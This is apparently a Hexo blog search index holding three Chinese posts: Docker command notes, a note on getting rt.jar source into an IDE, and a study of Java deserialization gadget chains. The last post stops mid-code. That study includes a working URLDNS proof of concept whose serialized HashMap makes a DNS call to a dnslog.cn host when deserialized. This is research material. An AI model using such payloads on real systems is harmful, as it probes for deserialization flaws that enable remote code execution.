<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Docker学习笔记</title>
    <url>/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>欲穷千里目，更上一层楼。</p>
</blockquote>
<p>我在调试漏洞的过程中会密切地和Docker打交道，今天来总结一下。 </p>
<a id="more"></a>

<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>Docker包括三个基本概念：</p>
<ul>
<li>镜像<code>Image</code></li>
<li>容器<code>Container</code></li>
<li>仓库<code>Repository</code></li>
</ul>
<p>镜像就像类，容器就像实例。</p>
<p>容器的实质是进程，容器进程属于自己独立的命名空间，也就是进程隔离</p>
<p>仓库是容器的存储分发，默认仓库内的镜像是<code>&lt;仓库名&gt;:&lt;Tag&gt;</code>，默认tag是latest</p>
<p>对于一个<a href="https://hub.docker.com/_/ubuntu" target="_blank" rel="noopener">ubuntu</a>仓库来说：</p>
<p>ubuntu是仓库的名字，<code>ubuntu：16.04</code>和<code>ubuntu:18.04</code>则是两个不同标签代表不同版本。</p>
<p>仓库通常是<strong>两段式命名</strong>，例如<code>ownername/nginx</code></p>
<p>前者是用户名，后者是软件名</p>
<h1 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h1><h2 id="获取镜像"><a href="#获取镜像" class="headerlink" title="获取镜像"></a>获取镜像</h2><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker pull [args] [域名[：端口号] /] 仓库名[:标签]</span><br></pre></td></tr></table></figure>

<p><code>docker pull --help</code>看细节</p>
<ul>
<li>docker仓库地址：<code>&lt;域名/IP&gt;[:端口号]</code> 默认地址是docker.io</li>
<li>仓库名：<code>&lt;仓库名/软件名&gt;</code> 仓库名不写默认是library，也就是官方镜像</li>
</ul>
<p>比如：<code>docker pull ubuntu：18.04</code></p>
<p>完整仓库名就是：<code>docker.io/library/ubuntu:18.04</code></p>
<h2 id="运行镜像"><a href="#运行镜像" class="headerlink" title="运行镜像"></a>运行镜像</h2><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -i -t --rm ubuntu:18.04 /bin/bash</span></span><br></pre></td></tr></table></figure>

<p>解读：</p>
<ul>
<li><code>-i</code>参数是启动容器内交互式操作模式</li>
<li><code>-t</code>参数是在容器内开启一个终端</li>
<li><code>--rm</code>代表容器退出后随之将该容器删除，不必再手动rm</li>
<li><code>bash</code>就是给容器的命令，这里我们希望得到交互式shell，所以打开bash</li>
</ul>
<p>其他参数：</p>
<ul>
<li><code>-d</code>可以让容器在后台运行</li>
<li><code>-p</code></li>
<li><code>exit</code>退出容器</li>
</ul>
<h2 id="列出镜像"><a href="#列出镜像" class="headerlink" title="列出镜像"></a>列出镜像</h2><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker image ls</span><br></pre></td></tr></table></figure>

<p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519121316891.png" alt="image-20210519121316891"></p>
<p>参数：</p>
<ul>
<li><code>docker image ls -q</code>只显示image的id</li>
<li><code>docker image ls ubuntu</code>只显示仓库名是ubuntu的image</li>
</ul>
<h2 id="删除本地镜像"><a href="#删除本地镜像" class="headerlink" title="删除本地镜像"></a>删除本地镜像</h2><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker image rm [args] &lt;image<span class="string">'s id/reponame/&gt;</span></span><br></pre></td></tr></table></figure>

<p>参数：</p>
<ul>
<li>这里面的<code>image&#39;s id</code>通常可以是长ID12位，也可以仅仅是前3位短id</li>
</ul>
<p>配合docker image ls</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">我们需要删除所有仓库名为 redis 的镜像：</span><br><span class="line">docker image rm $&#123;docker image ls -q redis&#125;</span><br></pre></td></tr></table></figure>



<h1 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h1><h2 id="新建-amp-启动"><a href="#新建-amp-启动" class="headerlink" title="新建&amp;启动"></a>新建&amp;启动</h2><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> ubuntu:18.04 /bin/<span class="built_in">echo</span> <span class="string">"helloworld"</span></span></span><br></pre></td></tr></table></figure>

<h2 id="守护态运行"><a href="#守护态运行" class="headerlink" title="守护态运行"></a>守护态运行</h2><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> ubuntu /bin/sh -c <span class="string">"while true; do echo hello world; sleep 1; done"</span></span></span><br></pre></td></tr></table></figure>

<p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519122754667.png" alt="image-20210519122754667"></p>
<p>会将结果打印在本地终端，这里需要启动<code>-d</code>参数，来让容器在后台运行：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -d ubuntu /bin/sh -c <span class="string">"while true; do echo hello world; sleep 1; done"</span></span></span><br></pre></td></tr></table></figure>

<p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519122959476.png" alt="image-20210519122959476"></p>
<p>就不再会打印到本地终端。</p>
<p>使用<code>docker logs 86d4eab113a908ce2ee49fa46145623d62a290a76ab3807429588f7c2868bd6</code>来查看</p>
<p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519123132506.png" alt="image-20210519123132506"></p>
<p>输出内容会在日子里体现出来，</p>
<h2 id="查看运行中的容器"><a href="#查看运行中的容器" class="headerlink" title="查看运行中的容器"></a>查看运行中的容器</h2><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker container ls</span><br></pre></td></tr></table></figure>

<p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519130640053.png" alt="image-20210519130640053"></p>
<p>对比可以发现，刚才那一长串才是完整ID</p>
<p>查看自动容器的日志：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker container logs [id or name]</span><br></pre></td></tr></table></figure>



<h2 id="终止-amp-重启容器"><a href="#终止-amp-重启容器" class="headerlink" title="终止&amp;重启容器"></a>终止&amp;重启容器</h2><p>首先，当容器内的程序结束时，容器也将自动终止。</p>
<p>对于一般情况，可以使用<code>docker container stop [id or name]</code>来终止</p>
<p>终止状态的docker信息可以<code>docker container ls -a</code>来查看</p>
<p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519131228416.png" alt="image-20210519131228416"></p>
<p>当然</p>
<p>对于已经停掉的容器，重新启动可以<code>docker container start [id or name]</code></p>
<p>对于正在运行的容器，强制重新启动可以<code>docker container restart [id or name]</code></p>
<h2 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h2><p>attach和exec都可以，更推荐exec</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker container ls</span><br><span class="line"></span><br><span class="line">docker exec -it [shortid] /bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519132015322.png" alt="image-20210519132015322"></p>
<p>原因：</p>
<ul>
<li><code>-it</code>一起使用时，可以进入交互模式，并且可以看到熟悉的<code>linux</code>命令提示符</li>
</ul>
<h2 id="容器的导出-amp-导入"><a href="#容器的导出-amp-导入" class="headerlink" title="容器的导出&amp;导入"></a>容器的导出&amp;导入</h2><p><strong>导出</strong></p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker export id &gt; ubuntu.tar</span><br></pre></td></tr></table></figure>



<p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519132819881.png" alt="image-20210519132819881"></p>
<p><strong>导入</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat ubuntu.tar | docker import - <span class="built_in">test</span>/ubuntu:v1.0</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker image ls</span></span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED              VIRTUAL SIZE</span><br><span class="line">test/ubuntu         v1.0                9d37a6082e97        About a minute ago   171.3 MB</span><br></pre></td></tr></table></figure>

<p>也可以通过网址来import：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ docker <span class="keyword">import</span> http:<span class="comment">//example.com/exampleimage.tgz example/imagerepo</span></span><br></pre></td></tr></table></figure>



<h2 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h2><p><strong>删除正在运行的容器</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker container rm -f [id or name]</span><br></pre></td></tr></table></figure>

<p><strong>删除所有容器</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">docker container prune</span><br></pre></td></tr></table></figure>

<h2 id="外部网络访问容器"><a href="#外部网络访问容器" class="headerlink" title="外部网络访问容器"></a>外部网络访问容器</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d -P nginx</span><br></pre></td></tr></table></figure>

<p><code>-P</code>参数的意思就是随机打开一个本地端口</p>
<p>查看访问日志；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker logs id</span><br></pre></td></tr></table></figure>

<p><code>-p</code> 则可以指定要映射的端口，并且，在一个指定端口上只可以绑定一个容器。支持的格式有 <code>ip:hostPort:containerPort | ip::containerPort | hostPort:containerPort</code>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-p 55500:80</span><br></pre></td></tr></table></figure>

<p>意思就是本机的55500端口映射给80端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-p 80:80</span><br></pre></td></tr></table></figure>

<p>的意思就是<strong>映射全部端口</strong>。</p>
<p>比较：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-p 80:80 绑定对应所有端口</span><br><span class="line">-p 127.0.0.1:80:80 指定映射使用一个特定地址</span><br><span class="line">-p 127.0.0.1::80 绑定本地的任意端口给容器的80端口</span><br></pre></td></tr></table></figure>

<p><strong>查看端口映射的配置</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker port id 80</span><br></pre></td></tr></table></figure>

<p>查看当前所有的网络配置</p>
<p><strong>查看docker内部网络地址</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker inspect id</span><br></pre></td></tr></table></figure>





<h1 id="额外的备忘命令"><a href="#额外的备忘命令" class="headerlink" title="额外的备忘命令"></a>额外的备忘命令</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看当前运行的容器</span></span><br><span class="line">docker ps</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看所有容器，包括停止的</span></span><br><span class="line">docker ps -a</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看最新创建的容器，只列出最后创建的</span></span><br><span class="line">docker ps -l</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看网络端口</span></span><br><span class="line">docker port [容器ID|容器名]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看容器内部的标准输出</span></span><br><span class="line">docker logs [容器ID|容器名]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看容器内部运行的进程</span></span><br><span class="line">docker top [容器ID|容器名]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看 Docker 的底层信息。它会返回一个 JSON 文件记录着 Docker 容器的配置和状态信息</span></span><br><span class="line">docker inspect [容器ID|容器名]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除指定image</span></span><br><span class="line">docker rmi image_id</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除容器，删除容器时，容器必须是停止状态</span></span><br><span class="line">docker rm [容器ID|容器名]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除所有的容器</span></span><br><span class="line">docker rm $(docker ps -aq)</span><br></pre></td></tr></table></figure>





<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://yeasy.gitbook.io/docker_practice/" target="_blank" rel="noopener">Docker-入门到实战</a></p>
<p><a href="https://segmentfault.com/a/1190000017151019" target="_blank" rel="noopener">MacOS Docker安装和使用</a></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次对线rt.jar</title>
    <url>/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>独立三边静，轻生一剑知。</p>
</blockquote>
<p>记录一次对线rt.jar的经历。</p>
<a id="more"></a>

<h1 id="过程全记录"><a href="#过程全记录" class="headerlink" title="过程全记录"></a>过程全记录</h1><p>前一阵在复习CC链的时候，想着从PoC来逆向分析ysoserial师傅们的挖掘思路。</p>
<p>LazyMap函数的get函数很有挖掘潜力，所以我需要找哪些类调用了get方法。</p>
<p>已知答案是AnnotationInvocationHandler的invoke函数调用了get函数，可以执行下去。</p>
<p>现在我想用IDEA搜索一下，但是无奈没有找到。 </p>
<p>发现这个类属于sun.reflect.annotation包，位于rt.jar中，主动去搜索这个类你是可以看到的。</p>
<p><strong>IDEA可以反编译出来rt.jar的源码，但是不会帮你进去搜索代码细节，因为它没有源码</strong></p>
<p>直接去翻$JAVA_HOME，src.zip里面是jdk源码，但是并没有sun包。。</p>
<p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513153049164.png" alt="image-20210513153049164"></p>
<p>搜索资料，我发现sun是oracle选择闭源的几个包之一。</p>
<p>Oracle选择性闭源？无奈又好笑，这能忍？</p>
<p>如何拿到rt.jar的源码，火速学习了一波。</p>
<p>所以我想着先去搞到openJDK7的源码。</p>
<p>搜了一波，发现<a href="http://hg.openjdk.java.net/" target="_blank" rel="noopener">http://hg.openjdk.java.net/</a>可以搞到源码，网速感人，要有耐心。。。</p>
<p>以我自己的7u21为例子：</p>
<p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513150521166.png" alt="image-20210513150521166"></p>
<p>点击jdk7u-jdk，进去之后点击browse可以看内容</p>
<p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513150614447.png" alt="image-20210513150614447"></p>
<p>也可以不废话，直接点击zip下载</p>
<p>然后就拿到了一个zip解压：</p>
<p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513150829266.png" alt="image-20210513150829266"></p>
<p>然后依次进入src-share-classes，看到了sun：</p>
<p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513150912940.png" alt="image-20210513150912940"></p>
<p>也就是说，IDEA无法帮我们搜索的内容，我们现在可以自己添加进去了。</p>
<p>如何关联？</p>
<p>来到Project Structure - SKDs，把我们的源码的classes添加进去就可以了</p>
<p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513151529264.png" alt="image-20210513151529264"></p>
<p>这次再搜索一下，直接find in path 搜索path</p>
<p>就可以看到了：</p>
<p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513151800556.png" alt="image-20210513151800556"></p>
<p>翻出了JD-GUI，比较一下。</p>
<p>我是直接来到$JAVA_HOME，进入jre/lib，这些东西会参与java-runtime</p>
<p>啪的一下很快奥！</p>
<p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513152337666.png" alt="image-20210513152337666"></p>
<p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513152445982.png" alt="image-20210513152445982"></p>
<p>不得不佩服西方老师傅门的耐心，漏洞在牛角尖上。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://my.oschina.net/u/2518341/blog/1931088" target="_blank" rel="noopener">获取openJDK源码</a></p>
<p><a href="https://www.jianshu.com/p/96334b23f4f0" target="_blank" rel="noopener">JDK（rt.jar）源码和IDE关联</a></p>
<p><a href="http://hg.openjdk.java.net/" target="_blank" rel="noopener">http://hg.openjdk.java.net/</a></p>
]]></content>
      <categories>
        <category>Java代码审计</category>
      </categories>
      <tags>
        <tag>实战记录</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化利用链补全计划</title>
    <url>/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>温故而知新。</p>
</blockquote>
<p>站在巨人们的肩膀上，总结Java反序列化漏洞利用链，会持续更新。</p>
<p>同步项目：<a href="https://github.com/0range228/Gadgets" target="_blank" rel="noopener">Gadgets</a>    </p>
<a id="more"></a>

<h1 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面"></a>写在最前面</h1><p>Java反序列化RCE三要素：<strong>readobject反序列化利用点 + 利用链 + RCE触发点</strong>。</p>
<p>审计maven仓库里面的jar包时，记得先拿到源码：</p>
<ul>
<li>点右上角download source </li>
<li>下载pom.xml里面声明的依赖jars：mvn dependency:resolve -Dclassifier=sources</li>
<li>JD-GUI</li>
<li></li>
</ul>
<h1 id="readObject源码分析"><a href="#readObject源码分析" class="headerlink" title="readObject源码分析"></a>readObject源码分析</h1><p>梦开始的地方。</p>
<p>正常使用反序列化，就会执行java.io.ObjectInputStream类中的readObejct方法。</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511172731640.png" alt="image-20210511172731640"></p>
<p><strong>重点分析readObject0方法，它是核心方法。</strong>跟进去看：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511173117069.png" alt="image-20210511173117069"></p>
<p>这里最重要的是进行了对象类型的选择，根据不同类型执行操作。</p>
<p>这里会先执行readOrdinaryObject方法，unshared是false。</p>
<p>进去看看：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511174136473.png" alt="image-20210511174136473"></p>
<p>看到点眉目了，<strong>readSerialData其实才是真正反序列化对象</strong>，进入readSerialData函数看看：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511192758582.png" alt="image-20210511192758582"></p>
<p>到这里，可以理清整个过程的关键步骤了。</p>
<p>在readSerialData中比较关键的是这个判断条件：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511175925746.png" alt="image-20210511175925746"></p>
<p>其中slotDesc.hasReadObjectMethod()获取的是readObjectMethod这个属性，<strong>如果反序列化的类没有重写readobject()，那么readObjectMethod这个属性就是空</strong>，如果这个类重写了readobject()，就会执行readObject()方法。</p>
<p>所以这也就是为什么，挖掘这类漏洞，上来第一件事就是要：<strong>找到哪些类有重写readObject()方法</strong>。</p>
<p><strong>2021.5.24更新</strong></p>
<p>最近发现有个神奇的方法<code>defaultReadObject</code></p>
<p>他的javadoc如下：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210524155157492.png" alt="image-20210524155157492"></p>
<p>前面写到：</p>
<blockquote>
<p>读取非静态和非transient修饰的属性，并且只能被readObject方法调用</p>
</blockquote>
<p>懵懵的，写个demo实验一下：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210524155558480.png" alt="image-20210524155558480"></p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210524155522930.png" alt="image-20210524155522930"></p>
<p>会输出：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Hello，world！</span><br></pre></td></tr></table></figure>

<p>可以看到，Example类自己实现了readObject方法，并且在它内部还有一个<code>defaultReadObject</code>方法。</p>
<p>我们把它删掉会怎样？</p>
<p>答：这次输出是null，也就是s属性没有被序列化出来</p>
<p>所以<code>defaultReadObject</code>的作用就是执行流中对象默认的readObject方法，将对象的field反序列化出来。</p>
<p>还发现一个细节，为什么defaultReadObject的参数是一个ObjectInputStream参数？</p>
<p>看下图，是因为如果一个类自己实现了readObject方法，内部机制会invoke这个方法，参数就是当前流。</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210524160113446.png" alt="image-20210524160113446"></p>
<p>一句话总结，<code>defaultReadObject</code>方法一般用于自己实现的readObject方法中，需要一个流对象作为参数。</p>
<p>用来执行流中对象默认的readObject方法，将对象反序列化出来。</p>
<p>如果我们自定义序列化过程仅仅调用了这个方法而没有任何额外的操作，这其实和默认的序列化过程没任何区别。</p>
<p>多说几句：</p>
<p>有了defaultReadObject方法之后，就可以用户自主控制反序列化过程了。</p>
<p>比如说一个字段是加密的，我们可以在readObject方法中先调用defaultReadObject方法来将其他字段来正常反序列化出来，再在最后执行加密字段的追加append。</p>
<h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><blockquote>
<p>readobject反序列化利用点 + DNS查询，主要用来确认反序列化漏洞利用点的存在。</p>
</blockquote>
<p>最适合新手分析的反序列化链。ysoserial的一部分。</p>
<p>只依赖原生类，没有jdk版本限制。</p>
<p>dnslog平台可以选择：<a href="http://www.dnslog.cn/" target="_blank" rel="noopener">DNSLog.cn</a>，<a href="http://ceye.io" target="_blank" rel="noopener">ceye</a>，我选择了DNSLog。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>jdk版本：jdk8u162，网上PoC很多，这里用<a href="https://www.anquanke.com/post/id/201762" target="_blank" rel="noopener">lalajun</a>师傅的为例。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//0x01.生成payload</span></span><br><span class="line">        <span class="comment">//设置一个hashMap</span></span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">        <span class="comment">//设置我们可以接受DNS查询的地址</span></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://oh6pfs.dnslog.cn"</span>);</span><br><span class="line">        <span class="comment">//将URL的hashCode字段设置为允许修改</span></span><br><span class="line">        Field f = Class.forName(<span class="string">"java.net.URL"</span>).getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">      </span><br><span class="line">        <span class="comment">//**以下的蜜汁操作是为了不在put中触发URLDNS查询，如果不这么写就会触发两次（之后会解释）**</span></span><br><span class="line">        <span class="comment">//1. 设置url的hashCode字段为0xdeadbeef（随意的值）</span></span><br><span class="line">        f.set(url, <span class="number">0xdeadbeef</span>); </span><br><span class="line">        <span class="comment">//2. 将url放入hashMap中，右边参数随便写</span></span><br><span class="line">        hashMap.put(url, <span class="string">"rmb122"</span>);</span><br><span class="line">        <span class="comment">//修改url的hashCode字段为-1，为了触发DNS查询</span></span><br><span class="line">        f.set(url, -<span class="number">1</span>); </span><br><span class="line">      </span><br><span class="line">        <span class="comment">//0x02.写入文件模拟网络传输</span></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        <span class="comment">//0x03.读取文件，进行反序列化触发payload</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功触发dns查询记录：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511165114468.png" alt="image-20210511165114468"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>三要素：HashMap / URL / HashCode</p>
<p>大体流程：</p>
<ol>
<li>new一个HashMap对象，key-value对为URL-String类型，key设置为我们的dnslog的地址</li>
<li>暴力反射，将URL类的hashCode字段改为public，默认是private</li>
<li>将url对象的hashCode字段随便改成一个值</li>
<li>将url对象放入HashMap中作为key，value也随便写一个</li>
<li>将f对象的hashCode字段改为-1，<strong>触发漏洞</strong></li>
</ol>
<p>最终的payload结构是 一个HashMap，里面包含了 一个修改了hashCode为-1的URL类对象。</p>
<p><strong>由于HashMap类自己有实现readObject方法，那么在反序列化过程中就会执行他自己的readObject。</strong></p>
<h3 id="搞懂HashMap"><a href="#搞懂HashMap" class="headerlink" title="搞懂HashMap"></a>搞懂HashMap</h3><blockquote>
<p><strong>HashMap 可以看作是一个链表散列的数据结构 , 也就是数组和链表的结合体.</strong></p>
</blockquote>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511193717145.png" alt="image-20210511193717145"></p>
<p>对于主干来说，当要存放一个entry的时候，步骤如下：</p>
<ol>
<li>计算key的hash：hash(k)</li>
<li>通过hash(k)映射到有限的数组a的位置i</li>
<li>在a[i]的位置存入value</li>
</ol>
<p>自然就会想到，<strong>如果哈希冲突了怎么办？</strong>HashMap对于不同的元素，如果hash值相同，会采用链表指针的方式来挂在后面。</p>
<blockquote>
<p><strong>HashMap的主干是一个Entry数组</strong>，主干数组的长度一定是2的次幂。</p>
<p>Entry是HashMap的基本组成单元，每一个Entry包含一个key-value键值对。（其实所谓Map其实就是保存了两个对象之间的映射关系的一种集合）</p>
</blockquote>
<p>看源码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//jdk7</span></span><br><span class="line"><span class="keyword">transient</span> Entry&lt;K,V&gt;[] table = (Entry&lt;K,V&gt;[]) EMPTY_TABLE;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Entry是HashMap中的一个静态内部类。</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">Map</span>.<span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">  <span class="keyword">final</span> K key;</span><br><span class="line">  V value;</span><br><span class="line">  Entry&lt;K,V&gt; next;<span class="comment">//存储指向下一个Entry的引用，单链表结构</span></span><br><span class="line">  <span class="keyword">int</span> hash;<span class="comment">//对key进行hash运算后得到的值，存储在Entry中，避免重复计算</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Creates new entry.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  Entry(<span class="keyword">int</span> h, K k, V v, Entry&lt;K,V&gt; n) &#123;</span><br><span class="line">    value = v;</span><br><span class="line">    next = n;</span><br><span class="line">    key = k;</span><br><span class="line">    hash = h;</span><br><span 